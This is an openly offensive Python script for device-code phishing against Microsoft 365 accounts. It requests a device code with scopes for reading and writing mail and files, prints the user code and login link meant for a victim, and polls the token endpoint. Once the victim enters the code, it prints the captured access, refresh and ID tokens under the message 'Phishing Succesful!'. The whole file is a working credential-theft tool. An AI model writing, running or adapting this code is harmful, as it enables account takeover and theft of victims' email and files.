import requests
import json
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def getDeviceCode(clientId):
    url = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode'
    headers = {
        'user-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    scope = "Contacts.Read Files.ReadWrite Mail.Read Notes.Read Mail.ReadWrite openid profile User.Read email offline_access"


    r = requests.post(url, headers=headers, data={
        "client_id": clientId,
        "scope": scope
    }, verify=False)

    if r.status_code != 200:
        print("[ERROR] Invalid client_id")
    else:
        data = json.loads(r.text)
        user_code = data['user_code']
        device_code = data['device_code']
        login = 'https://microsoft.com/devicelogin'
        print(f'User_code: {user_code} \n Device_code: {device_code} \n Login_url: {login}')
        return device_code
        

def getAccessToken(clientId, device_code):
    url = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/token'
    headers = {
        'user-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    grant = 'urn:ietf:params:oauth:grant-type:device_code'
    timeout = False
    while not timeout:
        try:
            r = requests.post(url, headers=headers, data={
                "client_id": clientId,
                "code": device_code,
                "grant_type": grant
            }, verify=False)
            
            time.sleep(3)
            print(f'Status { r.status_code}')
            if "authorization_pending" in r.text:
                print("[INFO] Authorization Pending...")
            elif "expired_token" in r.text:
                print("[INFO] Token Expired!")
                timeout = True
            elif r.status_code == 200:
                print("[INFO] Phishing Succesful!")
                data = json.loads(r.text)
                access_token = data['access_token']
                refresh_token = data['refresh_token']
                id_token = data['id_token']
                print(f'access_token: {access_token}\n refresh_token: {refresh_token}\n id_token: {id_token}')
                timeout = True
        except ValueError:
            print("[ERROR] Something went wrong :(")



def deviceCodePhsihing():
    clientId = '{ENTER_CLIENT_ID}'
    print('Generating URL...\n')
    device_code = getDeviceCode(clientId)    
    time.sleep(20)
    print('Polling Authentication...\n')
    getAccessToken(clientId, device_code)







deviceCodePhsihing()